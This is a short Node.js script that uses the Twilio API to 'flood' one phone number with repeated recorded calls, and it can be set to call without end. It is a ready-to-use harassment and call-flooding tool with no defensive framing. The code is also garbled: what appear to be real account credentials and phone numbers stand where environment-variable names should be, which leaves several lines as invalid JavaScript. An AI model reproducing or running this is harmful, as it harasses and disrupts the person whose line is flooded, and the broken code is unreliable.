require('dotenv').config()

const client = new require('twilio')(process.env.AC04e15bae6fcfde3492408b0a43cddb5e, process.env.079ca0d473641636406793dc0f97ed9b);

// Set this to 0 for infinite
const max = process.env.MAX_CALLS || 3;

// Don't change this
let count = 1;

console.info(`:: Flooding [ ${process.env.+50230120984} ] from [ ${process.env.+19705174366} ]`);
console.info(`:: Starting flood of ${max} calls`);

// Call finish method when necessary
placeCall().then(finished).catch(console.error);
process.on('SIGINT', finished);

function placeCall() {
	return new Promise((resolve, reject) =>
		client.calls.create({ record: true, url: process.env.TWIML_URL, to: process.env.50230120984, from: process.env.19705174366, /* sendDigits: (true) ? '1' : null  */ })
			.then((call) => {
				console.info(`:: Call ${count++} placed with ID [ ${call.sid.substring(0, 8) + '...' + call.sid.substring(call.sid.length - 8)} ]`);
				count < max + 1 || max === 0 ? placeCall().then(resolve).catch(reject) : resolve();
			})
			.catch(reject));
}

function finished() {
	console.info(`:: Finished flood of ${count - 1} calls`);
	process.exit(0);
}
